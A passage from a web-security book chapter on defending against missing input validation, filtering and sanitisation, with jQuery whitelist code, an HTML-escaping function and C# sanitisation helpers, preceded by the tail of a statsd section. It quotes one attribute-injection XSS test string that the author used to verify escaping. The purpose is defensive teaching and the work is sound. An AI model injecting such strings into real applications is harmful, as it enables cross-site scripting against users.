<p>A gauge is a snap-shot of a reading in your application code, like your <a href="https://github.com/b/statsd_spec/blob/master/README.md#gauges">cars fuel gauge</a> for example. As opposed to the count type which is calculated by statsd, a gauge is calculated at the statsd client.</p>

<figure class="code">
  <figcaption>Sets</figcaption>

<div class="highlight"><pre><code></code>s
</pre></div>

</figure>

<p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#sets">Sets</a> allow you to send the number of <a href="https://github.com/etsy/statsd/blob/master/docs/metric_types.md#sets">unique occurrences</a> of events between flushes, so for example you could send the source address of every request to your web application and statsd would workout the number of unique source requests per flush interval.</p>

<p>So for example if you have statsd running on a server called graphing-server with the default port, you can test sending a count metric with the following command:</p>

<figure class="code">
  <figcaption>statsd receiving protocol (example)</figcaption>

<div class="highlight"><pre><code></code>echo "&lt;meteric-name&gt;:&lt;actual-value&gt;|c" | nc -u -w0 graphing-server 8125
</pre></div>

</figure>

<p>The server and port are specified in the config file that you create for yourself. You can create this from the <a href="https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js"><code>exampleConfig.js</code></a> as a starting point. In <code>exampleConfig.js</code> you will see the server and port properties. The current options for server are tcp or udp, with udp being the default. The server file must exist in the <a href="https://github.com/etsy/statsd/tree/master/servers"><code>./servers/</code></a> directory.</p>

<p>One of the ways we can generate statistics to send to our listening statsd daemon is by using one of the many language specific <a href="https://github.com/etsy/statsd/wiki#client-implementations">statsd clients</a>, which make it trivially easy to collect and send application statistics via a single routine call.</p>


<img src="images/statsd-graphite.png" alt="statsd graphite"/>


<h4 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionAVERAGE.png"/>


<h5 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic">Generic</h5>

<p>What ever you can do to help establish clean lines of separation of concerns in terms of both domain and technology, and keep as much as possible as simple as possible, the harder it will be for defects and malicious code to hide.</p>

<p>Your staple practises when it comes to defending against potentially dangerous input are validation and filtering. There are cases though when the business requires that input must be accepted that is dangerous yet still valid. This is where you will need to implement sanitisation. There is a lot more research and thought involved when you need to perform sanitisation, so the first cause of action should be to confirm that the specific dangerous yet valid input is in-fact essential.</p>

<p>
  <strong>Recommendations:</strong>
</p>

<p>Research:</p>

<ul>
  <li>Libraries</li>
  <li>The <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">execution contexts</a> that your data will flow through and / or be placed in</li>
  <li>Which character signatures need to be sanitised</li>
</ul>

<p>Attempt to use well tested, battle hardened language specific libraries that know how to validate, filter and sanitise.</p>

<p>Create enough “Evil Test Conditions” as discussed in the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a> to verify that:</p>

<ul>
  <li>
<strong>Validation</strong>
    <ul>
      <li>Only white listed characters can be received (both client and server side)</li>
      <li>Maximum and minimum field lengths are enforced</li>
      <li>Constrain fields to well structured data, like: credit card numbers, dates, social security numbers, area codes, e-mail addresses, etc. The more you can define and constrain the types of data that is permitted in any given field, the easier it is to apply a white list and validate effectively.  
        <p>WebComponents have come a long way and I think thy are perfect for this task.  </p>

        <p>With WebComponents, you get to create your own custom elements, an HTML tag. The browser will understand these natively, so they will work with any framework or library you are using. In order to define your own custom element, the tag name you define must be all lower case and must contain at least one hyphen used for separating name-spaces. No elements will be added to HTML, SVG or MathML that contain hyphens.  </p>

        <p>Each <a href="https://w3c.github.io/webcomponents/spec/custom/">Custom Element</a> (<code>my-password</code> for example) has a corresponding <a href="https://w3c.github.io/webcomponents/spec/imports/">HTML Import</a> (<code>my-password.html</code> for example) that provides the <a href="https://www.polymer-project.org/1.0/docs/devguide/quick-tour">definition of the Custom Element</a>, behaviour (JavaScript), DOM structure and styling. Nothing in the Custom Elements HTML Import can leak out, it is a component, encapsulated. Styles can also not leak in. So as our applications continue to grow, Custom Elements are a great tool for modularising concerns.  </p>

        <p>Custom Elements are currently only natively supported in Chrome and Opera, but we have the <a href="http://webcomponents.org/polyfills/">webcomponents.js set of polyfills</a> which means we can all use WebComponents.  </p>

        <p>Polymer is a library that helps you write WebComponents and mediates with the browser on your behalf, it also polyfills.  </p>

        <p>Custom Element authors can also expose <a href="https://www.polymer-project.org/1.0/docs/devguide/styling#custom-css-properties">Custom CSS properties</a> that they think consumers may want to apply values to, these styles are prefixed with <code>--</code> and are essentially an interface to a backing (CSS property) field, which would otherwise be inaccessible.  </p>

        <p>The Custom Element author can also decide to define a set of CSS properties as a single Custom CSS property, called a <a href="https://www.polymer-project.org/1.0/docs/devguide/styling#custom-css-mixins">Custom CSS mixin</a>, and then allow all of the properties within the set to be applied to a specific CSS rule in an elements local DOM. This is done using the <a href="https://tabatkins.github.io/specs/css-apply-rule/">CSS @apply rule</a>. This allows consumers to mix in any styles within the single Custom CSS property, but only intentionally by using the <code>--</code> prefix.  </p>

        <p>Polymer also has a large <a href="https://elements.polymer-project.org/">collection of Custom Elements</a> already created for you out of the box. Some of these Custom Elements are perfect for constraining and providing validation and filtering of input types, <a href="https://elements.polymer-project.org/browse?package=gold-elements">credit card details</a> for example.  </p>
      </li>
      <li>You have read, understood and implemented <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation">Validation</a> as per Identify Risks section</li>
    </ul>
  </li>
  <li>
<strong>Filtering</strong>
    <ul>
      <li>Your filtering routines are doing as expected with valid and non valid input (both client and server side)</li>
      <li>You have read, understood and implemented <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering">Filtering</a> as per Identify Risks section</li>
    </ul>
  </li>
  <li>
<strong>Sanitisation</strong>
    <ul>
      <li>All valid characters that need some modification are modified. Modifying could simply be a case of for example rounding a float down (removing precision), or changing the case of an alpha character. Not usually a security issue.</li>
      <li>Sanitising or transforming the character signatures known to be dangerous in the <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">execution contexts</a> you have discovered you have in your code that these character signatures pass through / are placed in; are transformed into their safe counterparts. If your libraries cover all cases, which from my experience I have not seen yet, that is great, but often there will be edge cases that stop the libraries being useful in every case. I provide an example of this below where the available libraries did not cover the edge cases I had in a project I worked on a few years ago. When this happens you may need to create some sanitisation logic. At this point, you are really going to have to gain good understanding of the execution contexts that will affect you and the different types of escaping you need to know about.</li>
      <li>You have read, understood and implemented <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">Sanitisation</a> as per Identify Risks section</li>
    </ul>
  </li>
</ul>

<h6 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping">Types of Escaping:</h6>

<p>Escaping is a technique used to sanitise. Escaped data will still render in the browser properly. Escaping simply lets the interpreter know that the data is not intended to be executed and thus prevents the attack.</p>

<p>There are a number of types of escaping you need to know about depending on where you may be intending on inserting untrusted data. Work through the following set of rules in order:</p>

<ol class="numeric">
  <li>HTML Escape</li>
  <li>Attribute Escape</li>
  <li>JavaScript Escape</li>
  <li>HTML Escape JSON values in HTML context</li>
  <li>CSS Escape</li>
  <li>URL Escape</li>
  <li>Sanitise HTML</li>
  <li>Prevent DOM-based XSS</li>
</ol>

<p>All of the above points are covered in depth in the OWASP <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>. <strong>Familiarise yourself with the rules before completing any custom sanitisation work</strong>.</p>

<h6 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp">Example in JavaScript and C#</h6>

<aside>

  <p>When out of the box libraries do not cover all of your sanitisation needs.</p>


</aside>

<p>The following example was taken from a project I worked on a few years ago.</p>

<p>Client side validation, filtering and sanitisation is more about UX (User Experience) helping the honest user by saving round trip communications to the server than stopping an attacker, as an attacker will simply by-pass any client side defences.</p>

<p>We needed to apply a white list to all characters being entered into the <code>value</code> attribute of <code>input</code> elements of <code>type="text"</code> and also <code>textarea</code> elements. The requirement was that the end user could not insert invalid characters into one of these fields and by insert we mean:</p>

<ol class="numeric">
  <li>type the characters in</li>
  <li>[ctrl]+[v] a clipboard full of characters in</li>
  <li>right click -&gt; Paste</li>
</ol>

<p>The following was the strategy that evolved. Performance was measured and even with an interval much lower than the 300 milliseconds, the performance impact was negligible. As soon as any non white list character(s) was entered, it was immediately deleted within 300 milliseconds.</p>

<p><code>$</code> references jQuery.</p>

<figure class="code">
  <figcaption>Validation using white list</figcaption>

<div class="highlight"><pre><code></code><code class="kd">var</code> <code class="nx">userInputValidationIntervalId</code> <code class="o">=</code> <code class="mi">0</code><code class="p">;</code>

<code class="nx">setupUserInputValidation</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>

   <code class="kd">var</code> <code class="nx">textAreaMaxLength</code> <code class="o">=</code> <code class="mi">400</code><code class="p">;</code>
   <code class="kd">var</code> <code class="nx">elementsToValidate</code><code class="p">;</code>
   <code class="kd">var</code> <code class="nx">whiteList</code> <code class="o">=</code> <code class="sr">/[^A-Za-z_0-9\s.,]/g</code><code class="p">;</code>

   <code class="kd">var</code> <code class="nx">elementValue</code> <code class="o">=</code> <code class="p">{</code>
      <code class="nx">textarea</code><code class="o">:</code> <code class="s1">''</code><code class="p">,</code>
      <code class="nx">textareaChanged</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">obj</code><code class="p">)</code> <code class="p">{</code>
         <code class="kd">var</code> <code class="nx">initialValue</code> <code class="o">=</code> <code class="nx">obj</code><code class="p">.</code><code class="nx">value</code><code class="p">;</code>
         <code class="kd">var</code> <code class="nx">replacedValue</code> <code class="o">=</code> <code class="nx">initialValue</code><code class="p">.</code>
            <code class="nx">replace</code><code class="p">(</code><code class="nx">whiteList</code><code class="p">,</code> <code class="s2">""</code><code class="p">).</code>
            <code class="nx">slice</code><code class="p">(</code><code class="mi">0</code><code class="p">,</code> <code class="nx">textAreaMaxLength</code><code class="p">);</code>
         <code class="k">if</code> <code class="p">(</code><code class="nx">replacedValue</code> <code class="o">!==</code> <code class="nx">initialValue</code><code class="p">)</code> <code class="p">{</code>
            <code class="k">this</code><code class="p">.</code><code class="nx">textarea</code> <code class="o">=</code> <code class="nx">replacedValue</code><code class="p">;</code>
            <code class="k">return</code> <code class="kc">true</code><code class="p">;</code>
         <code class="p">}</code>
         <code class="k">return</code> <code class="kc">false</code><code class="p">;</code>
      <code class="p">},</code>
      <code class="nx">inputtext</code><code class="o">:</code> <code class="s1">''</code><code class="p">,</code>
      <code class="nx">inputtextChanged</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">obj</code><code class="p">)</code> <code class="p">{</code>
         <code class="kd">var</code> <code class="nx">initialValue</code> <code class="o">=</code> <code class="nx">obj</code><code class="p">.</code><code class="nx">value</code><code class="p">;</code>
         <code class="kd">var</code> <code class="nx">replacedValue</code> <code class="o">=</code> <code class="nx">initialValue</code><code class="p">.</code><code class="nx">replace</code><code class="p">(</code><code class="nx">whiteList</code><code class="p">,</code> <code class="s2">""</code><code class="p">);</code>
         <code class="k">if</code> <code class="p">(</code><code class="nx">replacedValue</code> <code class="o">!==</code> <code class="nx">initialValue</code><code class="p">)</code> <code class="p">{</code>
            <code class="k">this</code><code class="p">.</code><code class="nx">inputtext</code> <code class="o">=</code> <code class="nx">replacedValue</code><code class="p">;</code>
            <code class="k">return</code> <code class="kc">true</code><code class="p">;</code>
         <code class="p">}</code>
         <code class="k">return</code> <code class="kc">false</code><code class="p">;</code>
      <code class="p">}</code>
   <code class="p">};</code>

   <code class="nx">elementsToValidate</code> <code class="o">=</code> <code class="p">{</code>
      <code class="nx">textareainputelements</code><code class="o">:</code> <code class="p">(</code><code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
         <code class="kd">var</code> <code class="nx">elements</code> <code class="o">=</code> <code class="nx">$</code><code class="p">(</code><code class="s1">'#page'</code> <code class="o">+</code> <code class="nx">currentPage</code><code class="p">).</code><code class="nx">find</code><code class="p">(</code><code class="s1">'textarea'</code><code class="p">);</code>
         <code class="k">if</code> <code class="p">(</code><code class="nx">elements</code><code class="p">.</code><code class="nx">length</code> <code class="o">&gt;</code> <code class="mi">0</code><code class="p">)</code> <code class="p">{</code>
            <code class="k">return</code> <code class="nx">elements</code><code class="p">;</code>
         <code class="p">}</code>
         <code class="k">return</code> <code class="s1">'no elements found'</code><code class="p">;</code>
      <code class="p">}</code> <code class="p">()),</code>
      <code class="nx">textInputElements</code><code class="o">:</code> <code class="p">(</code><code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
         <code class="kd">var</code> <code class="nx">elements</code> <code class="o">=</code> <code class="nx">$</code><code class="p">(</code><code class="s1">'#page'</code> <code class="o">+</code> <code class="nx">currentPage</code><code class="p">).</code><code class="nx">find</code><code class="p">(</code><code class="s1">'input[type=text]'</code><code class="p">);</code>
         <code class="k">if</code> <code class="p">(</code><code class="nx">elements</code><code class="p">.</code><code class="nx">length</code> <code class="o">&gt;</code> <code class="mi">0</code><code class="p">)</code> <code class="p">{</code>
            <code class="k">return</code> <code class="nx">elements</code><code class="p">;</code>
         <code class="p">}</code>
         <code class="k">return</code> <code class="s1">'no elements found'</code><code class="p">;</code>
      <code class="p">}</code> <code class="p">())</code>
   <code class="p">};</code>

   <code class="c1">// store the intervals id in outer scope</code>
   <code class="c1">// so we can clear the interval when we change pages.</code>
   <code class="nx">userInputValidationIntervalId</code> <code class="o">=</code> <code class="nx">setInterval</code><code class="p">(</code><code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
      <code class="kd">var</code> <code class="nx">element</code><code class="p">;</code>

      <code class="c1">// Iterate through each one and remove any characters not in the whitelist.</code>
      <code class="c1">// Iterate through each one and trim any that are longer than 400.</code>

      <code class="k">for</code> <code class="p">(</code><code class="nx">element</code> <code class="k">in</code> <code class="nx">elementsToValidate</code><code class="p">)</code> <code class="p">{</code>
         <code class="k">if</code> <code class="p">(</code><code class="nx">elementsToValidate</code><code class="p">.</code><code class="nx">hasOwnProperty</code><code class="p">(</code><code class="nx">element</code><code class="p">))</code> <code class="p">{</code>
            <code class="nx">elementsToValidate</code>
            <code class="k">if</code> <code class="p">(</code><code class="nx">elementsToValidate</code><code class="p">[</code><code class="nx">element</code><code class="p">]</code> <code class="o">===</code> <code class="s1">'no elements found'</code><code class="p">)</code>
               <code class="k">continue</code><code class="p">;</code>

            <code class="nx">$</code><code class="p">.</code><code class="nx">each</code><code class="p">(</code><code class="nx">elementsToValidate</code><code class="p">[</code><code class="nx">element</code><code class="p">],</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
               <code class="nx">$</code><code class="p">(</code><code class="k">this</code><code class="p">).</code><code class="nx">attr</code><code class="p">(</code><code class="s1">'value'</code><code class="p">,</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
                  <code class="kd">var</code> <code class="nx">name</code> <code class="o">=</code> <code class="nx">$</code><code class="p">(</code><code class="k">this</code><code class="p">).</code><code class="nx">prop</code><code class="p">(</code><code class="s1">'tagName'</code><code class="p">).</code><code class="nx">toLowerCase</code><code class="p">();</code>
                  <code class="nx">name</code> <code class="o">=</code> <code class="nx">name</code> <code class="o">===</code> <code class="s1">'input'</code> <code class="o">?</code> <code class="nx">name</code> <code class="o">+</code> <code class="nx">$</code><code class="p">(</code><code class="k">this</code><code class="p">).</code><code class="nx">prop</code><code class="p">(</code><code class="s1">'type'</code><code class="p">)</code> <code class="o">:</code> <code class="nx">name</code><code class="p">;</code>
                  <code class="k">if</code> <code class="p">(</code><code class="nx">elementValue</code><code class="p">[</code><code class="nx">name</code> <code class="o">+</code> <code class="s1">'Changed'</code><code class="p">](</code><code class="k">this</code><code class="p">))</code>
                     <code class="k">this</code><code class="p">.</code><code class="nx">value</code> <code class="o">=</code> <code class="nx">elementValue</code><code class="p">[</code><code class="nx">name</code><code class="p">];</code>
               <code class="p">});</code>
            <code class="p">});</code>
         <code class="p">}</code>
      <code class="p">}</code>
   <code class="p">},</code> <code class="mi">300</code><code class="p">);</code> <code class="c1">// Milliseconds.</code>
<code class="p">};</code>
</pre></div>

</figure>

<p>Each time we changed the page, we cleared the interval and reset it for the new page.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nx">clearInterval</code><code class="p">(</code><code class="nx">userInputValidationIntervalId</code><code class="p">);</code>
<code class="nx">setupUserInputValidation</code><code class="p">();</code>
</pre></div>

</figure>

<p>HTML5 provides the <code>pattern</code> attribute on the <code>input</code> tag, which allows us to specify a regular expression that the text received is checked against. Although this does not apply to <code>textarea</code>s. Also when validation occurs is not specified in the <a href="https://html.spec.whatwg.org/multipage/forms.html#the-pattern-attribute">HTML specification</a>, so this may not provide enough control.</p>

<p>Now what we do here is extend the <code>String</code> prototype with a function called <code>htmlEscape</code>.</p>

<figure class="code" id="sanitisation-using-escaping">
  <figcaption>Sanitisation using escaping</figcaption>

<div class="highlight"><pre><code></code><code class="k">if</code> <code class="p">(</code><code class="k">typeof</code> <code class="nb">Function</code><code class="p">.</code><code class="nx">prototype</code><code class="p">.</code><code class="nx">method</code> <code class="o">!==</code> <code class="s2">"function"</code><code class="p">)</code> <code class="p">{</code>
   <code class="nb">Function</code><code class="p">.</code><code class="nx">prototype</code><code class="p">.</code><code class="nx">method</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">name</code><code class="p">,</code> <code class="nx">func</code><code class="p">)</code> <code class="p">{</code>
      <code class="k">this</code><code class="p">.</code><code class="nx">prototype</code><code class="p">[</code><code class="nx">name</code><code class="p">]</code> <code class="o">=</code> <code class="nx">func</code><code class="p">;</code>
      <code class="k">return</code> <code class="k">this</code><code class="p">;</code>
   <code class="p">};</code>
<code class="p">}</code>

<code class="nb">String</code><code class="p">.</code><code class="nx">method</code><code class="p">(</code><code class="s1">'htmlEscape'</code><code class="p">,</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>

   <code class="c1">// Escape the following characters with HTML entity encoding</code>
   <code class="c1">// to prevent switching into any execution context,</code>
   <code class="c1">// such as script, style, or event handlers.</code>
   <code class="c1">// Using hex entities is recommended in the spec.</code>
   <code class="c1">// In addition to the 5 characters significant in XML (&amp;, &lt;, &gt;, ", '),</code>
   <code class="c1">// the forward slash is included as it helps to end an HTML entity.</code>
   <code class="kd">var</code> <code class="nx">character</code> <code class="o">=</code> <code class="p">{</code>
      <code class="s1">'&amp;'</code><code class="o">:</code> <code class="s1">'&amp;amp;'</code><code class="p">,</code>
      <code class="s1">'&lt;'</code><code class="o">:</code> <code class="s1">'&amp;lt;'</code><code class="p">,</code>
      <code class="s1">'&gt;'</code><code class="o">:</code> <code class="s1">'&amp;gt;'</code><code class="p">,</code>
      <code class="s1">'"'</code><code class="o">:</code> <code class="s1">'&amp;quot;'</code><code class="p">,</code>
      <code class="c1">// Double escape character entity references. Why?</code>
      <code class="c1">// The XmlTextReader that is setup in XmlDocument.LoadXml on the service considers</code>
      <code class="c1">// the character entity references (&amp;#xxxx;) to be the character they represent.</code>
      <code class="c1">// All XML is converted to unicode on reading and any such entities are</code>
      <code class="c1">// removed in favour of the unicode character they represent.</code>
      <code class="c1">// So we double escape character entity references.</code>
      <code class="c1">// These now get read to the XmlDocument and saved to the database as</code>
      <code class="c1">// double encoded Html entities.</code>
      <code class="c1">// Now when these values are pulled from the database and sent to the browser,</code>
      <code class="c1">// it decodes the &amp; and displays #x27; and/or #x2F.</code>
      <code class="c1">// This isn't what we want to see in the browser, so on the way out,</code>
      <code class="c1">// we use the below SingleDecodeDoubleEncodedHtml extension method.</code>
      <code class="s2">"'"</code><code class="o">:</code> <code class="s1">'&amp;amp;#x27;'</code><code class="p">,</code>    <code class="c1">// &amp;apos; is not recommended</code>
      <code class="s1">'/'</code><code class="o">:</code> <code class="s1">'&amp;amp;#x2F;'</code>     <code class="c1">// forward slash is included as it helps end an HTML entity</code>
   <code class="p">};</code>

   <code class="k">return</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
      <code class="k">return</code> <code class="k">this</code><code class="p">.</code><code class="nx">replace</code><code class="p">(</code><code class="sr">/[&amp;&lt;&gt;"'/]/g</code><code class="p">,</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">c</code><code class="p">)</code> <code class="p">{</code>
         <code class="k">return</code> <code class="nx">character</code><code class="p">[</code><code class="nx">c</code><code class="p">];</code>
      <code class="p">});</code>
   <code class="p">};</code>
<code class="p">}());</code>
</pre></div>

</figure>

<p>Just before any user input was sent back to the server, we would check each of the fields that we were receiving input from by doing the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nx">element</code><code class="p">.</code><code class="nx">value</code><code class="p">.</code><code class="nx">htmlEscape</code><code class="p">();</code>
</pre></div>

</figure>

<p>“<em>HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a <code>&lt;div&gt;</code> tag. It even sort of works for untrusted data that goes into attributes, particularly if you’re religious about using quotes around your attributes.</em>”</p>

<blockquote>
  <p>OWASP XSS Prevention Cheat Sheet</p>
</blockquote>

<p>For us, this would be enough, as we would be <code>HTML</code> escaping our <code>textarea</code> elements and we were happy to make sure we were religious about using quotes around the <code>value</code> attribute on <code>input</code> of <code>type="text"</code>.</p>

<p>“<em>But HTML entity encoding doesn’t work if you’re putting untrusted data inside a <code>&lt;script&gt;</code> tag anywhere, or an event handler attribute like <code>onmouseover</code>, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you’re putting untrusted data into.</em>” </p>

<blockquote>
  <p>OWASP XSS Prevention Cheat Sheet</p>
</blockquote>

<p>The escaping rules discussed <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping">above</a> detail this. Check out the <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Why_Can.27t_I_Just_HTML_Entity_Encode_Untrusted_Data.3F">OWASP resource</a> for full details.</p>

<p>Rule #2 of the OWASP XSS Prevention Cheat Sheet discusses attribute escaping. Now because we were only using <code>value</code> attributes and we had the luxury of being able to control the fact that we would always be using properly quoted attributes, we didn’t have to take this extra step of escaping all (other than alphanumeric) ASCII characters that is values less than 256 with the <code>&amp;#xHH</code> format to prevent switching out of the attribute context.</p>

<p>Because I wanted to be sure about not being able to escape out of the attributes context if it was properly quoted I tested it. I created a collection of injection attacks, none of which worked. If you enter something like the following into the attribute <code>value</code> of an <code>input</code> element where <code>type="text"</code>, then the first double quote will be interpreted as the corresponding quote and the end double quote will be interpreted as the end quote of the <code>onmouseover</code> attribute value.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="s2">" onmouseover="</code><code class="nx">alert</code><code class="p">(</code><code class="mi">2</code><code class="p">)</code>
</pre></div>

</figure>

<p>All the legitimate double quotes are interpreted as the double quote <code>HTML</code> entity <code>"</code> and all illegitimate double quotes are interpreted as the character value. This is what you end up with:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nx">value</code><code class="o">=</code><code class="s2">" &amp;quot; onmouseover=&amp;quot;alert(2)"</code>
</pre></div>

</figure>

<p>Now in regards to the code comments in the block of code above titled “Sanitisation using escaping”, I mentioned having to double escape character references. We were using <code>XSL</code> for the <code>HTML</code> because we needed to perform transformations before delivering to the browser. Because we were sending the strings to the browser, it was easiest to single decode the double encoded <code>HTML</code> on the service side only. Now because we were still focused on the client side sanitisation and we would soon be shifting our focus to making sure we cover the server side, we knew we were going to have to create some sanitisation routines for our .NET service. Because the routines are quite likely going to be static and we were pretty much just dealing with strings, we created an extensions class in a new project in a common library we already had. This would provide the widest use from our sanitisation routines. It also allowed us to wrap any existing libraries or parts of them that we wanted to get use of.</p>

<figure class="code">
  <figcaption>Common.Security.Encoding.Extensions.SingleDecodeDoubleEncodedHtml</figcaption>

<div class="highlight"><pre><code></code><code class="k">namespace</code> <code class="nn">Common.Security.Encoding</code> <code class="p">{</code>
   <code class="c1">/// &lt;summary&gt;</code>
   <code class="c1">/// Provides a series of extension methods that perform sanitisation.</code>
   <code class="c1">/// Escaping, unescaping, etc.</code>
   <code class="c1">/// Usually targeted at user input, to help defend against the likes of XSS attacks.</code>
   <code class="c1">/// &lt;/summary&gt;</code>
   <code class="k">public</code> <code class="k">static</code> <code class="k">class</code> <code class="nc">Extensions</code> <code class="p">{</code>
      <code class="c1">/// &lt;summary&gt;</code>
      <code class="c1">/// Returns a new string in which all occurrences of a double escaped html character</code>
      <code class="c1">/// (that's an html entity immediatly prefixed with another html entity)</code>
      <code class="c1">/// in the current instance are replaced with the single escaped character.</code>
      <code class="c1">/// &lt;/summary&gt;</code>
      <code class="c1">/// &lt;param name="source"&gt;&lt;/param&gt;</code>
      <code class="c1">/// &lt;returns&gt;The new string.&lt;/returns&gt;</code>
      <code class="k">public</code> <code class="k">static</code> <code class="kt">string</code> <code class="nf">SingleDecodeDoubleEncodedHtml</code><code class="p">(</code><code class="k">this</code> <code class="kt">string</code> <code class="n">source</code><code class="p">)</code> <code class="p">{</code>
         <code class="k">return</code> <code class="n">source</code><code class="p">.</code><code class="n">Replace</code><code class="p">(</code><code class="s">"&amp;amp;#x"</code><code class="p">,</code> <code class="s">"&amp;#x"</code><code class="p">);</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>Now when we ran our <code>xslt</code> transformation on the service, we chain our new extension method on the end. Which gives us back a single encoded string that the browser is happy to display as the decoded value.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="k">return</code> <code class="nf">Transform</code><code class="p">().</code><code class="n">SingleDecodeDoubleEncodedHtml</code><code class="p">();</code>
</pre></div>

</figure>

<p>Now turning our attention to the server side… Untrusted data (data entered by a user), should always be treated as though it may contain attack code.
This data should not be sent anywhere without taking the necessary steps to detect and neutralise the malicious code depending on which <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">execution contexts</a> it will pass through.</p>

<p>With applications becoming more interconnected, attacks being buried in user input and decoded and/or executed by a downstream interpreter is common. Input validation, that is restricting user input to allow only certain white listed characters and restricting field lengths are only two forms of defence. Any decent attacker can get around client side validation, so you need to employ defence in depth. If you need to validate, filter and sanitise, at the very least, it needs to be done on the server side.</p>

<p>I found <code>System.Net.WebUtility</code> from the <code>System.Web.dll</code> assembly to do most of what we needed other than provide us with fine grained information of what had been tampered with. So I took it and extended it slightly. We had not employed AOP at this stage, so there was some copy past modifying.</p>

<p>First up, the exceptions we used:</p>

<figure class="code">
  <figcaption>Common.WcfHelpers.ErrorHandling.Exceptions.WcfException</figcaption>

<div class="highlight"><pre><code></code><code class="k">namespace</code> <code class="nn">Common.WcfHelpers.ErrorHandling.Exceptions</code> <code class="p">{</code>
   <code class="k">public</code> <code class="k">abstract</code> <code class="k">class</code> <code class="nc">WcfException</code> <code class="p">:</code> <code class="n">Exception</code> <code class="p">{</code>
      <code class="c1">/// &lt;summary&gt;</code>
      <code class="c1">/// In order to set the message for the client, set it here,</code>
      <code class="c1">/// or via the property directly in order to over ride default value.</code>
      <code class="c1">/// &lt;/summary&gt;</code>
      <code class="c1">/// &lt;param name="message"&gt;</code>
      <code class="c1">/// The message to be assigned to the Exception's Message.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="c1">/// &lt;param name="innerException"&gt;</code>
      <code class="c1">/// The exception to be assigned to the Exception's InnerException.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="c1">/// &lt;param name="messageForClient"&gt;</code>
      <code class="c1">/// The client friendly message. This parameter is optional, but should be set.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="k">public</code> <code class="nf">WcfException</code><code class="p">(</code>
         <code class="kt">string</code> <code class="n">message</code><code class="p">,</code> <code class="n">Exception</code> <code class="n">innerException</code> <code class="p">=</code> <code class="k">null</code><code class="p">,</code> <code class="kt">string</code> <code class="n">messageForClient</code> <code class="p">=</code> <code class="k">null</code>
      <code class="p">)</code> <code class="p">:</code> <code class="k">base</code><code class="p">(</code><code class="n">message</code><code class="p">,</code> <code class="n">innerException</code><code class="p">)</code> <code class="p">{</code>
         <code class="n">MessageForClient</code> <code class="p">=</code> <code class="n">messageForClient</code><code class="p">;</code>
      <code class="p">}</code>

      <code class="c1">/// &lt;summary&gt;</code>
      <code class="c1">/// This is the message that the services client will see.</code>
      <code class="c1">/// Make sure it is set in the constructor. Or here.</code>
      <code class="c1">/// &lt;/summary&gt;</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="n">MessageForClient</code> <code class="p">{</code>
         <code class="k">get</code> <code class="p">{</code>
            <code class="k">return</code> <code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">_messageForClient</code><code class="p">)</code> <code class="p">?</code>
               <code class="s">"The MessageForClient property of WcfException was not set"</code> <code class="p">:</code>
               <code class="n">_messageForClient</code><code class="p">;</code>
         <code class="p">}</code>
         <code class="k">set</code> <code class="p">{</code> <code class="n">_messageForClient</code> <code class="p">=</code> <code class="k">value</code><code class="p">;</code> <code class="p">}</code>
      <code class="p">}</code>
      <code class="k">private</code> <code class="kt">string</code> <code class="n">_messageForClient</code><code class="p">;</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>And the more specific <code>SanitisationWcfException</code>:</p>

